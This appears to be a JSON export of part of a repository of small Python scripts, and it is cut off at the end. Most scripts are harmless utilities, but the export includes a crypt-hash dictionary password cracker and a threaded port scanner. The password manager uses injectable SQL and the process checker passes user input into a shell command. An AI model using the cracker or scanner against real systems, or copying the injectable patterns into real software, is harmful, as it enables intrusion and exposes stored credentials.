          "name": "password_checker.py",
          "type": "blob",
          "size": 0.494140625,
          "content": "import time\npwd=\"AKS2608\"     #any password u want to set\n\ndef IInd_func():\n  count1=0\n  for j in range(5):\n    a=0\n    count=0\n    user_pwd = input(\"\")        #password you remember\n    for i in range(len(pwd)):\n      if user_pwd[i] == pwd[a]:       #comparing remembered pwd with fixed pwd\n        a +=1\n        count+=1 \n    if count==len(pwd):\n      print(\"correct pwd\")\n      break\n    else:\n      count1 += 1\n      print(\"not correct\")\n  if count1==5:\n    time.sleep(30)\n    IInd_func()\n\nIInd_func()\n"
        },
        {
          "name": "password_cracker.py",
          "type": "blob",
          "size": 1.564453125,
          "content": "from __future__ import print_function\n\nfrom sys import platform as _platform\n\n# Script Name\t: password_cracker.py\n# Author\t\t: Craig Richards\n# Created\t\t: 20 May 2013\n# Last Modified\t:\n# Version\t\t: 1.0\n# Modifications\t:\n# Description\t: Old school password cracker using python\n\n# Check the current operating system to import the correct version of crypt\nif _platform in [\"linux\", \"linux2\", \"darwin\"]:  # darwin is _platform name for Mac OS X\n    import crypt  # Import the module\nelif _platform == \"win32\":\n    # Windows\n    try:\n        import fcrypt  # Try importing the fcrypt module\n    except ImportError:\n        print(\"Please install fcrypt if you are on Windows\")\n\n\ndef testPass(cryptPass):  # Start the function\n    salt = cryptPass[0:2]\n    dictFile = open(\"dictionary.txt\", \"r\")  # Open the dictionary file\n    for word in dictFile.readlines():  # Scan through the file\n        word = word.strip(\"\\n\")\n        cryptWord = crypt.crypt(word, salt)  # Check for password in the file\n        if cryptWord == cryptPass:\n            print(\"[+] Found Password: \" + word + \"\\n\")\n            return\n    print(\"[-] Password Not Found.\\n\")\n    return\n\n\ndef main():\n    passFile = open(\"passwords.txt\")  # Open the password file\n    for line in passFile.readlines():  # Read through the file\n        if \":\" in line:\n            user = line.split(\":\")[0]\n            cryptPass = line.split(\":\")[1].strip(\" \")  # Prepare the user name etc\n            print(\"[*] Cracking Password For: \" + user)\n            testPass(cryptPass)  # Call it to crack the users password\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "password_manager.py",
          "type": "blob",
          "size": 4.84375,
          "content": "import sqlite3\nfrom getpass import getpass\nimport os\n\n# set the environment variable ADMIN_PASS to your desired string, which will be your password.\nADMIN_PASSWORD = os.environ[\"ADMIN_PASS\"]\nconnect = getpass(\"What is your admin  password?\\n\")\n\nwhile connect != ADMIN_PASSWORD:\n    connect = getpass(\"What is your admin password?\\n\")\n    if connect == \"q\":\n        break\n\nconn = sqlite3.connect(\"password_manager.db\")\ncursor_ = conn.cursor()\n\n\ndef get_password(service_):\n    command = 'SELECT * from STORE WHERE SERVICE = \"' + service_ + '\"'\n    cursor = conn.execute(command)\n    for row in cursor:\n        username_ = row[1]\n        password_ = row[2]\n    return [username_, password_]\n\n\ndef add_password(service_, username_, password_):\n    command = (\n        'INSERT INTO STORE (SERVICE,USERNAME,PASSWORD) VALUES(\"'\n        + service_\n        + '\",\"'\n        + username_\n        + '\",\"'\n        + password_\n        + '\");'\n    )\n    conn.execute(command)\n    conn.commit()\n\n\ndef update_password(service_, password_):\n    command = (\n        'UPDATE STORE set PASSWORD = \"'\n        + password_\n        + '\" where SERVICE = \"'\n        + service_\n        + '\"'\n    )\n    conn.execute(command)\n    conn.commit()\n    print(service_ + \" password updated successfully.\")\n\n\ndef delete_service(service_):\n    command = 'DELETE from STORE where SERVICE = \"' + service_ + '\"'\n    conn.execute(command)\n    conn.commit()\n    print(service_ + \" deleted from the database successfully.\")\n\n\ndef get_all():\n    cursor_.execute(\"SELECT * from STORE\")\n    data = cursor_.fetchall()\n    if len(data) == 0:\n        print(\"No Data\")\n    else:\n        for row in data:\n            print(\"service = \", row[0])\n            print(\"username = \", row[1])\n            print(\"password = \", row[2])\n            print()\n\n\ndef is_service_present(service_):\n    cursor_.execute(\"SELECT SERVICE from STORE where SERVICE = ?\", (service_,))\n    data = cursor_.fetchall()\n    if len(data) == 0:\n        print(\"There is no service named %s\" % service_)\n        return False\n    else:\n        return True\n\n\nif connect == ADMIN_PASSWORD:\n    try:\n        conn.execute(\n            \"\"\"CREATE TABLE STORE\n            (SERVICE TEXT PRIMARY KEY NOT NULL,\n            USERNAME TEXT NOT NULL,\n            PASSWORD TEXT NOT NULL);\n            \"\"\"\n        )\n        print(\"Your safe has been created!\\nWhat would you like to store in it today?\")\n    except:\n        print(\"You have a safe, what would you like to do today?\")\n\n    while True:\n        print(\"\\n\" + \"*\" * 15)\n        print(\"Commands:\")\n        print(\"quit = quit program\")\n        print(\"get = get username and password\")\n        print(\"getall = show all the details in the database\")\n        print(\"store = store username and password\")\n        print(\"update = update password\")\n        print(\"delete = delete a service details\")\n        print(\"*\" * 15)\n        input_ = input(\":\")\n\n        if input_ == \"quit\":\n            print(\"\\nGoodbye, have a great day.\\n\")\n            conn.close()\n            break\n\n        elif input_ == \"store\":\n            service = input(\"What is the name of the service?\\n\")\n            cursor_.execute(\"SELECT SERVICE from STORE where SERVICE = ?\", (service,))\n            data = cursor_.fetchall()\n            if len(data) == 0:\n                username = input(\"Enter username : \")\n                password = getpass(\"Enter password : \")\n                if username == \"\" or password == \"\":\n                    print(\"Your username or password is empty.\")\n                else:\n                    add_password(service, username, password)\n                    print(\"\\n\" + service.capitalize() + \" password stored\\n\")\n            else:\n                print(\"Service named {} already exists.\".format(service))\n\n        elif input_ == \"get\":\n            service = input(\"What is the name of the service?\\n\")\n            flag = is_service_present(service)\n            if flag:\n                username, password = get_password(service)\n                print(service.capitalize() + \" Details\")\n                print(\"Username : \", username)\n                print(\"Password : \", password)\n\n        elif input_ == \"update\":\n            service = input(\"What is the name of the service?\\n\")\n            if service == \"\":\n                print(\"Service is not entered.\")\n            else:\n                flag = is_service_present(service)\n                if flag:\n                    password = getpass(\"Enter new password : \")\n                    update_password(service, password)\n\n        elif input_ == \"delete\":\n            service = input(\"What is the name of the service?\\n\")\n            if service == \"\":\n                print(\"Service is not entered.\")\n            else:\n                flag = is_service_present(service)\n                if flag:\n                    delete_service(service)\n\n        elif input_ == \"getall\":\n            get_all()\n\n        else:\n            print(\"Invalid command.\")\n"
        },
        {
          "name": "password_programs_multiple",
          "type": "tree",
          "content": null
        },
        {
          "name": "personal_translator.py",
          "type": "blob",
          "size": 1.3427734375,
          "content": "# -*- coding: utf-8 -*-\n\"\"\"Personal_translator.ipynb\n\nAutomatically generated by Colaboratory.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/1lHb0mCvF6Ie3QaTt3VfqlNjNs6vuV5qJ\n\"\"\"\n\n# uncomment the line to intall googletrans library\n# ! pip install googletrans\n\nfrom googletrans import Translator\n\n# make a simple function that will translate any language to english\ndef text_translator(Text):\n    translator = Translator()\n    translated = translator.translate(Text, dest=\"en\")\n    return translated.text\n\n\ntext_translator(\n    \"Cidades brasileiras integram programa de preservação de florestas\"\n)  # portuguese to english\n\ntext_translator(\"Guten Morgen, wie gehts?\")  # german to english\n\ntext_translator(\"Ami tumake bhalobashi\")  # bengali to english\n\ntext_translator(\"ਮੈਨੂੰ ਇੱਕ ਗੱਲ ਦੱਸੋ\")  # punjabi to english\n\ntext_translator(\"I am fine\")  # english text remains constant\n\n\ndef eng2punj_translator(Text):  # english to punjabi translator\n    translator = Translator()\n    translated = translator.translate(Text, dest=\"pa\")\n    return translated.text\n\n\neng2punj_translator(\"Meet you soon\")\n\n\ndef eng2beng_translator(Text):  # english to bengali translator\n    translator = Translator()\n    translated = translator.translate(Text, dest=\"bn\")\n    return translated.text\n\n\neng2beng_translator(\"So happy to see you\")\n"
        },
        {
          "name": "ph_email.py",
          "type": "blob",
          "size": 1.341796875,
          "content": "#!/usr/bin/python3\n\n# find phone numbers and email addresses\n# ./ph_email.py searches for phone numbers and emails in the latest clipboard\n# entry and writes the matches into matches.txt\n\nimport re\n\nimport pyperclip\n\n# Phone regex overview per line\n# word boundary\n# area code +91, 91, 0\n# optional space\n# ten numbers\n# word boundary\n\nfind_phone = re.compile(\n    r\"\"\"\\b\n\t\t\t\t\t\t\t(\\+?91|0)?\n\t\t\t\t\t\t\t\\ ?\n\t\t\t\t\t\t\t(\\d{10})\n\t\t\t\t\t\t\t\\b\n\t\t\t\t\t\t\t\"\"\",\n    re.X,\n)\n\n# email regex source : http://www.regexlib.com/REDetails.aspx?regexp_id=26\nfind_email = re.compile(\n    r\"\"\"(\n\t\t\t\t\t\t\t([a-zA-Z0-9_\\-\\.]+)\t\n\t\t\t\t\t\t\t@\n\t\t\t\t\t\t\t((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)\n\t\t\t\t\t\t\t|\n\t\t\t\t\t\t\t(([a-zA-Z0-9\\-]+\\.)+))\n\t\t\t\t\t\t\t([a-zA-Z]{2,4}|[0-9]{1,3})\n\t\t\t\t\t\t\t(\\]?)\n\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\"\"\",\n    re.X,\n)\n\ntext = pyperclip.paste()  # retrieve text from clipboard\n\nmatches = []  # list to store numbers and emails\n\n# ph[1] means second item of the group-wise tuple\n# which is returned by findall function\n# same applies to email\n\nfor ph in find_phone.findall(text):\n    matches.append(ph[1])\n\nfor em in find_email.findall(text):\n    matches.append(em[0])\n\n# display number of matches\nprint(f\"{len(matches)} matches found\")\n\n# if matches are found add then to file\nif len(matches):\n    with open(\"matches.txt\", \"a\") as file:\n        for match in matches:\n            file.write(match)\n            file.write(\"\\n\")\n"
        },
        {
          "name": "ping_servers.py",
          "type": "blob",
          "size": 3.556640625,
          "content": "from __future__ import print_function\n\nimport os  # Load the Library Module\nimport subprocess  # Load the Library Module\nimport sys  # Load the Library Module\n\n# Script Name\t\t: ping_servers.py\n# Author\t\t\t\t: Craig Richards\n# Created\t\t\t\t: 9th May 2012\n# Last Modified\t\t: 14th May 2012\n# Version\t\t\t\t: 1.1\n# Modifications\t\t: 1.1 - 14th May 2012 - CR Changed it to use the config directory to store the server files\n# Description\t : This script will, depending on the arguments supplied will ping the\n# servers associated with that application group.\n\nfilename = sys.argv[0]  # Sets a variable for the script name\nif (\n    \"-h\" in sys.argv or \"--h\" in sys.argv or \"-help\" in sys.argv or \"--help\" in sys.argv\n):  # Help Menu if called\n    print(\n        \"\"\"\nYou need to supply the application group for the servers you want to ping, i.e.\n    dms\n    swaps\n\nFollowed by the site i.e.\n    155\n    bromley\"\"\"\n    )\n    sys.exit(0)\nelse:\n\n    if (\n        len(sys.argv) < 3\n    ):  # If no arguments are passed,display the help/instructions on how to run the script\n        sys.exit(\n            \"\\nYou need to supply the app group. Usage : \"\n            + filename\n            + \" followed by the application group i.e. \\n \\t dms or \\n \\t swaps \\n \"\n            \"then the site i.e. \\n \\t 155 or \\n \\t bromley\"\n        )\n\n    appgroup = sys.argv[1]  # Set the variable appgroup as the first argument you supply\n    site = sys.argv[2]  # Set the variable site as the second argument you supply\n\n    if os.name == \"posix\":  # Check the os, if it's linux then\n        myping = \"ping -c 2 \"  # This is the ping command\n    elif os.name in (\"nt\", \"dos\", \"ce\"):  # Check the os, if it's windows then\n        myping = \"ping -n 2 \"  # This is the ping command\n\n    if \"dms\" in sys.argv:  # If the argument passed is dms then\n        appgroup = \"dms\"  # Set the variable appgroup to dms\n    elif \"swaps\" in sys.argv:  # Else if the argment passed is swaps then\n        appgroup = \"swaps\"  # Set the variable appgroup to swaps\n\n    if \"155\" in sys.argv:  # If the argument passed is 155 then\n        site = \"155\"  # Set the variable site to 155\n    elif \"bromley\" in sys.argv:  # Else if the argument passed is bromley\n        site = \"bromley\"  # Set the variable site to bromley\n\nlogdir = os.getenv(\"logs\")  # Set the variable logdir by getting the OS environment logs\nlogfile = (\n    \"ping_\" + appgroup + \"_\" + site + \".log\"\n)  # Set the variable logfile, using the arguments passed to create the logfile\nlogfilename = os.path.join(\n    logdir, logfile\n)  # Set the variable logfilename by joining logdir and logfile together\nconfdir = os.getenv(\n    \"my_config\"\n)  # Set the variable confdir from the OS environment variable - 1.2\nconffile = appgroup + \"_servers_\" + site + \".txt\"  # Set the variable conffile - 1.2\nconffilename = os.path.join(\n    confdir, conffile\n)  # Set the variable conffilename by joining confdir and conffile together - 1.2\n\nf = open(logfilename, \"w\")  # Open a logfile to write out the output\nfor server in open(conffilename):  # Open the config file and read each line - 1.2\n    ret = subprocess.call(\n        myping + server, shell=True, stdout=f, stderr=subprocess.STDOUT\n    )  # Run the ping command for each server in the list.\n    if ret == 0:  # Depending on the response\n        f.write(\n            server.strip() + \" is alive\" + \"\\n\"\n        )  # Write out that you can receive a reponse\n    else:\n        f.write(\n            server.strip() + \" did not respond\" + \"\\n\"\n        )  # Write out you can't reach the box\n\nprint(\"\\n\\tYou can see the results in the logfile : \" + logfilename)\n# Show the location of the logfile\n"
        },
        {
          "name": "ping_subnet.py",
          "type": "blob",
          "size": 2.0478515625,
          "content": "from __future__ import print_function\n\nimport os  # Load the Library Module\nimport subprocess  # Load the Library Module\nimport sys  # Load the Library Module\n\n# Script Name\t\t: ping_subnet.py\n# Author\t\t\t\t: Craig Richards\n# Created\t\t\t\t: 12th January 2012\n# Last Modified\t\t:\n# Version\t\t\t\t: 1.0\n# Modifications\t\t:\n# Description\t\t\t: After supplying the first 3 octets it will scan the final range for available addresses\n\nfilename = sys.argv[0]  # Sets a variable for the script name\n\nif (\n    \"-h\" in sys.argv or \"--h\" in sys.argv or \"-help\" in sys.argv or \"--help\" in sys.argv\n):  # Help Menu if called\n    print(\n        \"\"\"\nYou need to supply the first octets of the address Usage : \"\"\"\n        + filename\n        + \"\"\" 111.111.111 \"\"\"\n    )\n    sys.exit(0)\nelse:\n\n    if (\n        len(sys.argv) < 2\n    ):  # If no arguments are passed then display the help and instructions on how to run the script\n        sys.exit(\n            \" You need to supply the first octets of the address Usage : \"\n            + filename\n            + \" 111.111.111\"\n        )\n\n    subnet = sys.argv[1]  # Set the variable subnet as the three octets you pass it\n\n    if os.name == \"posix\":  # Check the os, if it's linux then\n        myping = \"ping -c 2 \"  # This is the ping command\n    elif os.name in (\"nt\", \"dos\", \"ce\"):  # Check the os, if it's windows then\n        myping = \"ping -n 2 \"  # This is the ping command\n\n    f = open(\"ping_\" + subnet + \".log\", \"w\")  # Open a logfile\n    for ip in range(2, 255):  # Set the ip variable for the range of numbers\n        ret = subprocess.call(\n            myping + str(subnet) + \".\" + str(ip),\n            shell=True,\n            stdout=f,\n            stderr=subprocess.STDOUT,\n        )  # Run the command pinging the servers\n        if ret == 0:  # Depending on the response\n            f.write(\n                subnet + \".\" + str(ip) + \" is alive\" + \"\\n\"\n            )  # Write out that you can receive a reponse\n        else:\n            f.write(\n                subnet + \".\" + str(ip) + \" did not respond\" + \"\\n\"\n            )  # Write out you can't reach the box\n"
        },
        {
          "name": "polygon.py",
          "type": "blob",
          "size": 0.451171875,
          "content": "import pygame\nimport sys\nfrom pygame.locals import *\n\npygame.init()\nwindow = pygame.display.set_mode((400, 300), 0, 32)\npygame.display.set_caption(\"Shape\")\n\nWHITE = (255, 255, 255)\nGREEN = (0, 255, 0)\n\nwindow.fill(WHITE)\npygame.draw.polygon(window, GREEN, ((146, 0), (236, 277), (56, 277)))\n\n# Game logic\nwhile True:\n    for event in pygame.event.get():\n        if event.type == QUIT:\n            pygame.quit()\n            sys.exit()\n    pygame.display.update()\n"
        },
        {
          "name": "portscanner.py",
          "type": "blob",
          "size": 2.1162109375,
          "content": "from __future__ import print_function\n\nimport optparse  # Import the module\nfrom socket import *  # Import the module\nfrom threading import *  # Import the module\n\n# Script Name\t: portscanner.py\n# Author\t\t: Craig Richards\n# Created\t\t: 20 May 2013\n# Last Modified\t:\n# Version\t\t: 1.0\n# Modifications\t:\n# Description\t: Port Scanner, you just pass the host and the ports\n\nscreenLock = Semaphore(value=1)  # Prevent other threads from preceeding\n\n\ndef connScan(tgtHost, tgtPort):  # Start of the function\n    try:\n        connSkt = socket(AF_INET, SOCK_STREAM)  # Open a socket\n        connSkt.connect((tgtHost, tgtPort))\n        connSkt.send(\"\")\n        results = connSkt.recv(100)\n        screenLock.acquire()  # Acquire the lock\n        print(\"[+] %d/tcp open\" % tgtPort)\n        print(\"[+] \" + str(results))\n    except:\n        screenLock.acquire()\n        print(\"[-] %d/tcp closed \" % tgtPort)\n    finally:\n        screenLock.release()\n        connSkt.close()\n\n\ndef portScan(tgtHost, tgtPorts):  # Start of the function\n    try:\n        tgtIP = gethostbyname(tgtHost)  # Get the IP from the hostname\n    except:\n        print(\"[-] Cannot resolve '%s': Unknown host\" % tgtHost)\n        return\n    try:\n        tgtName = gethostbyaddr(tgtIP)  # Get hostname from IP\n        print(\"\\n[+] Scan Results for: \" + tgtName[0])\n    except:\n        print(\"\\n[+] Scan Results for: \" + tgtIP)\n    setdefaulttimeout(1)\n    for tgtPort in tgtPorts:  # Scan host and ports\n        t = Thread(target=connScan, args=(tgtHost, int(tgtPort)))\n        t.start()\n\n\ndef main():\n    parser = optparse.OptionParser(\"usage %prog -H\" + \" <target host> -p <target port>\")\n    parser.add_option(\"-H\", dest=\"tgtHost\", type=\"string\", help=\"specify target host\")\n    parser.add_option(\n        \"-p\",\n        dest=\"tgtPort\",\n        type=\"string\",\n        help=\"specify target port[s] seperated by a comma\",\n    )\n    (options, args) = parser.parse_args()\n    tgtHost = options.tgtHost\n    tgtPorts = str(options.tgtPort).split(\",\")\n    if (tgtHost == None) | (tgtPorts[0] == None):\n        print(parser.usage)\n        exit(0)\n    portScan(tgtHost, tgtPorts)\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "positiveNegetive.py",
          "type": "blob",
          "size": 0.1103515625,
          "content": "n = int(input(\"Enter number: \"))\nif n > 0:\n    print(\"Number is positive\")\nelse:\n    print(\"Number is negative\")\n"
        },
        {
          "name": "power_of_n.py",
          "type": "blob",
          "size": 1.359375,
          "content": "# Assign values to author and version.\n__author__ = \"Himanshu Gupta\"\n__version__ = \"1.0.0\"\n__date__ = \"2023-09-03\"\n\ndef binaryExponentiation(x: float, n: int) -> float:\n    \"\"\"\n    Function to calculate x raised to the power n (i.e., x^n) where x is a float number and n is an integer and it will return float value\n\n    Example 1:\n\n    Input: x = 2.00000, n = 10\n    Output: 1024.0\n    Example 2:\n\n    Input: x = 2.10000, n = 3\n    Output: 9.261000000000001\n\n    Example 3:\n\n    Input: x = 2.00000, n = -2\n    Output: 0.25\n    Explanation: 2^-2 = 1/(2^2) = 1/4 = 0.25\n    \"\"\"\n\n    if n == 0:\n        return 1\n\n    # Handle case where, n < 0.\n    if n < 0:\n        n = -1 * n\n        x = 1.0 / x\n\n    # Perform Binary Exponentiation.\n    result = 1\n    while n != 0:\n        # If 'n' is odd we multiply result with 'x' and reduce 'n' by '1'.\n        if n % 2 == 1:\n            result *= x\n            n -= 1\n        # We square 'x' and reduce 'n' by half, x^n => (x^2)^(n/2).\n        x *= x\n        n //= 2\n    return result\n\n\nif __name__ == \"__main__\":\n    print(f\"Author: {__author__}\")\n    print(f\"Version: {__version__}\")\n    print(f\"Function Documentation: {binaryExponentiation.__doc__}\")\n    print(f\"Date: {__date__}\")\n    \n    print() # Blank Line\n\n    print(binaryExponentiation(2.00000, 10))\n    print(binaryExponentiation(2.10000, 3))\n    print(binaryExponentiation(2.00000, -2))\n "
        },
        {
          "name": "power_of_two.py",
          "type": "blob",
          "size": 0.31640625,
          "content": "# Simple and efficient python program to check whether a number is series of power of two\r\n# Example:\r\n# Input:\r\n# 8\r\n# Output:\r\n# It comes in  power series of 2\r\na = int(input(\"Enter a number\"))\r\nif a & (a - 1) == 0:\r\n    print(\"It comes in  power series of 2\")\r\nelse:\r\n    print(\"It does not come in  power series of 2\")\r\n"
        },
        {
          "name": "powerdown_startup.py",
          "type": "blob",
          "size": 2.28515625,
          "content": "# Script Name\t\t: powerdown_startup.py\n# Author                : Craig Richards\n# Created\t\t: 05th January 2012\n# Last Modified\t\t: 21th September 2017\n# Version\t\t : 1.0\n\n# Modifications\t\t:\n\n# Description\t\t: This goes through the server list and pings the machine, if it's up it will load the putty session, if its not it will notify you.\n\nimport os  # Load the Library Module\nimport subprocess  # Load the Library Module\nfrom time import strftime  # Load just the strftime Module from Time\n\n\ndef windows():  # This is the function to run if it detects the OS is windows.\n    f = open(\"server_startup_\" + strftime(\"%Y-%m-%d\") + \".log\", \"a\")  # Open the logfile\n    for server in open(\n        \"startup_list.txt\", \"r\"\n    ):  # Read the list of servers from the list\n        ret = subprocess.call(\n            \"ping -n 3 %s\" % server,\n            shell=True,\n            stdout=open(\"NUL\", \"w\"),\n            stderr=subprocess.STDOUT,\n        )  # Ping the servers in turn\n        if ret == 0:  # If you get a response.\n            f.write(\n                \"%s: is alive, loading PuTTY session\" % server.strip() + \"\\n\"\n            )  # Write out to the logfile\n            subprocess.Popen((\"putty -load \" + server))  # Load the putty session\n        else:\n            f.write(\n                \"%s : did not respond\" % server.strip() + \"\\n\"\n            )  # Write to the logfile if the server is down\n\n\ndef linux():\n    f = open(\"server_startup_\" + strftime(\"%Y-%m-%d\") + \".log\", \"a\")  # Open the logfile\n    for server in open(\"startup_list.txt\"):  # Read the list of servers from the list\n        ret = subprocess.call(\n            \"ping -c 3 %s\" % server,\n            shell=True,\n            stdout=open(\"/dev/null\", \"w\"),\n            stderr=subprocess.STDOUT,\n        )  # Ping the servers in turn\n        if ret == 0:  # If you get a response.\n            f.write(\"%s: is alive\" % server.strip() + \"\\n\")  # Print a message\n            subprocess.Popen([\"ssh\", server.strip()])\n        else:\n            f.write(\"%s: did not respond\" % server.strip() + \"\\n\")\n\n\n# End of the functions\n\n# Start of the Main Program\n\nif os.name == \"posix\":  # If the OS is linux...\n    linux()  # Call the linux function\nelif os.name in (\"nt\", \"dos\", \"ce\"):  # If the OS is Windows...\n    windows()  # Call the windows function\nelse:\n    print(\"Not supported\")\n"
        },
        {
          "name": "powers of 2.py",
          "type": "blob",
          "size": 0.33203125,
          "content": "# Display the powers of 2 using anonymous function\n\nterms = 10\n\n# Uncomment code below to take input from the user\n# terms = int(input(\"How many terms? \"))\n\n# use anonymous function\nresult = list(map(lambda x: 2 ** x, range(terms)))\n\nprint(\"The total terms are:\",terms)\nfor i in range(terms):\n   print(\"2 raised to power\",i,\"is\",result[i])\n"
        },
        {
          "name": "powerup_checks.py",
          "type": "blob",
          "size": 5.4091796875,
          "content": "from __future__ import print_function\n\nimport os  # Load the Library Module\nimport sqlite3  # Load the Library Module\nimport subprocess  # Load the Library Module\nimport sys  # Load the Library Module\nfrom time import strftime  # Load just the strftime Module from Time\n\n# Script Name\t\t: powerup_checks.py\n# Author\t\t\t\t: Craig Richards\n# Created\t\t\t\t: 25th June 2013\n# Last Modified\t\t:\n# Version\t\t\t\t: 1.0\n# Modifications\t\t:\n# Description\t\t\t: Creates an output file by pulling all the servers for the given site from SQLITE database, then goes through the list pinging the servers to see if they are up on the network\n\ndropbox = os.getenv(\n    \"dropbox\"\n)  # Set the variable, by getting the value of the variable from the OS\nconfig = os.getenv(\n    \"my_config\"\n)  # Set the variable, by getting the value of the variable from the OS\ndbfile = \"Databases/jarvis.db\"  # Set the variable to the database\nmaster_db = os.path.join(\n    dropbox, dbfile\n)  # Create the variable by linking the path and the file\nlistfile = \"startup_list.txt\"  # File that will hold the servers\nserverfile = os.path.join(\n    config, listfile\n)  # Create the variable by linking the path and the file\noutputfile = \"server_startup_\" + strftime(\"%Y-%m-%d-%H-%M\") + \".log\"\n\n# Below is the help text\n\ntext = \"\"\"\n\nYou need to pass an argument, the options the script expects is \n\n    -site1\t\tFor the Servers relating to site1\n    -site2\tFor the Servers located in site2\"\"\"\n\n\ndef windows():  # This is the function to run if it detects the OS is windows.\n    f = open(outputfile, \"a\")  # Open the logfile\n    for server in open(serverfile, \"r\"):  # Read the list of servers from the list\n        # ret = subprocess.call(\"ping -n 3 %s\" % server.strip(), shell=True,stdout=open('NUL', 'w'),stderr=subprocess.STDOUT)\t# Ping the servers in turn\n        ret = subprocess.call(\n            \"ping -n 3 %s\" % server.strip(),\n            stdout=open(\"NUL\", \"w\"),\n            stderr=subprocess.STDOUT,\n        )  # Ping the servers in turn\n        if ret == 0:  # Depending on the response\n            f.write(\n                \"%s: is alive\" % server.strip().ljust(15) + \"\\n\"\n            )  # Write out to the logfile is the server is up\n        else:\n            f.write(\n                \"%s: did not respond\" % server.strip().ljust(15) + \"\\n\"\n            )  # Write to the logfile if the server is down\n\n\ndef linux():  # This is the function to run if it detects the OS is nix.\n    f = open(\"server_startup_\" + strftime(\"%Y-%m-%d\") + \".log\", \"a\")  # Open the logfile\n    for server in open(serverfile, \"r\"):  # Read the list of servers from the list\n        ret = subprocess.call(\n            \"ping -c 3 %s\" % server,\n            shell=True,\n            stdout=open(\"/dev/null\", \"w\"),\n            stderr=subprocess.STDOUT,\n        )  # Ping the servers in turn\n        if ret == 0:  # Depending on the response\n            f.write(\n                \"%s: is alive\" % server.strip().ljust(15) + \"\\n\"\n            )  # Write out to the logfile is the server is up\n        else:\n            f.write(\n                \"%s: did not respond\" % server.strip().ljust(15) + \"\\n\"\n            )  # Write to the logfile if the server is down\n\n\ndef get_servers(query):  # Function to get the servers from the database\n    conn = sqlite3.connect(master_db)  # Connect to the database\n    cursor = conn.cursor()  # Create the cursor\n    cursor.execute(\n        \"select hostname from tp_servers where location =?\", (query,)\n    )  # SQL Statement\n    print(\"\\nDisplaying Servers for : \" + query + \"\\n\")\n    while True:  # While there are results\n        row = cursor.fetchone()  # Return the results\n        if row == None:\n            break\n        f = open(serverfile, \"a\")  # Open the serverfile\n        f.write(\"%s\\n\" % str(row[0]))  # Write the server out to the file\n        print(row[0])  # Display the server to the screen\n        f.close()  # Close the file\n\n\ndef main():  # Main Function\n    if os.path.exists(serverfile):  # Checks to see if there is an existing server file\n        os.remove(serverfile)  # If so remove it\n\n    if len(sys.argv) < 2:  # Check there is an argument being passed\n        print(text)  # Display the help text if there isn't one passed\n        sys.exit()  # Exit the script\n\n    if (\n        \"-h\" in sys.argv\n        or \"--h\" in sys.argv\n        or \"-help\" in sys.argv\n        or \"--help\" in sys.argv\n    ):  # If the ask for help\n        print(text)  # Display the help text if there isn't one passed\n        sys.exit(0)  # Exit the script after displaying help\n    else:\n        if sys.argv[1].lower().startswith(\"-site1\"):  # If the argument is site1\n            query = \"site1\"  # Set the variable to have the value site\n        elif (\n            sys.argv[1].lower().startswith(\"-site2\")\n        ):  # Else if the variable is bromley\n            query = \"site2\"  # Set the variable to have the value bromley\n        else:\n            print(\n                \"\\n[-] Unknown option [-] \" + text\n            )  # If an unknown option is passed, let the user know\n            sys.exit(0)\n    get_servers(query)  # Call the get servers funtion, with the value from the argument\n\n    if os.name == \"posix\":  # If the OS is linux.\n        linux()  # Call the linux function\n    elif os.name in (\"nt\", \"dos\", \"ce\"):  # If the OS is Windows...\n        windows()  # Call the windows function\n\n    print(\n        \"\\n[+] Check the log file \" + outputfile + \" [+]\\n\"\n    )  # Display the name of the log\n\n\nif __name__ == \"__main__\":\n    main()  # Call the main function\n"
        },
        {
          "name": "primelib",
          "type": "tree",
          "content": null
        },
        {
          "name": "print hello world.py",
          "type": "blob",
          "size": 0.05859375,
          "content": "# This program prints Hello, world!\n\nprint('Hello, world!')\n"
        },
        {
          "name": "prison_break_scrapper.py",
          "type": "blob",
          "size": 0.8984375,
          "content": "\"\"\"\nScrapper for downloading prison break\nseries from an open server and putting them in a designated folder.\n\"\"\"\nimport os\nimport subprocess\n\nimport requests as req\nfrom bs4 import BeautifulSoup as bs\n\nBASE_URL = \"http://dl.funsaber.net/serial/Prison%20Break/season%20\"\n\n\ndef download_files(links, idx):\n    for link in links:\n        subprocess.call(\n            [\"aria2c\", \"-s\", \"16\", \"-x\", \"16\", \"-d\", \"season\" + str(idx), link]\n        )\n\n\ndef main():\n    for i in range(1, 5):\n        r = req.get(BASE_URL + str(i) + \"/1080/\")\n        soup = bs(r.text, \"html.parser\")\n        link_ = []\n        for link in soup.find_all(\"a\"):\n            if \".mkv\" in link.get(\"href\"):\n                link_.append(BASE_URL + str(i) + \"/1080/\" + link.get(\"href\"))\n        if not os.path.exists(\"season\" + str(i)):\n            os.makedirs(\"season\" + str(i))\n        download_files(link_, i)\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "pscheck.py",
          "type": "blob",
          "size": 1.3583984375,
          "content": "# Script Name\t\t: pscheck.py\n# Author\t\t\t\t: Craig Richards\n# Created\t\t\t\t: 19th December 2011\n# Last Modified\t\t: 17th June 2013\n# Version\t\t\t\t: 1.1\n\n# Modifications\t\t: 1.1 - 17/06/13 - CR - Changed to functions, and check os before running the program\n\n# Description\t\t\t: Process check on Nix boxes, diplsay formatted output from ps command\n\nimport os\nimport string\n\nimport commands\n\ntry:\n    input = raw_input\nexcept NameError:\n    pass\n\n\ndef ps():\n    program = input(\"Enter the name of the program to check: \")\n\n    try:\n        # perform a ps command and assign results to a list\n        output = commands.getoutput(\"ps -f|grep \" + program)\n        proginfo = string.split(output)\n\n        # display results\n        print(\n            \"\\n\\\n    Full path:\\t\\t\",\n            proginfo[5],\n            \"\\n\\\n    Owner:\\t\\t\\t\",\n            proginfo[0],\n            \"\\n\\\n    Process ID:\\t\\t\",\n            proginfo[1],\n            \"\\n\\\n    Parent process ID:\\t\",\n            proginfo[2],\n            \"\\n\\\n    Time started:\\t\\t\",\n            proginfo[4],\n        )\n    except:\n        print(\"There was a problem with the program.\")\n\n\ndef main():\n    if os.name == \"posix\":  # Unix/Linux/MacOS/BSD/etc\n        ps()  # Call the function\n    elif os.name in (\"nt\", \"dos\", \"ce\"):  # if the OS is windows\n        print(\"You need to be on Linux or Unix to run this\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "psunotify.py",
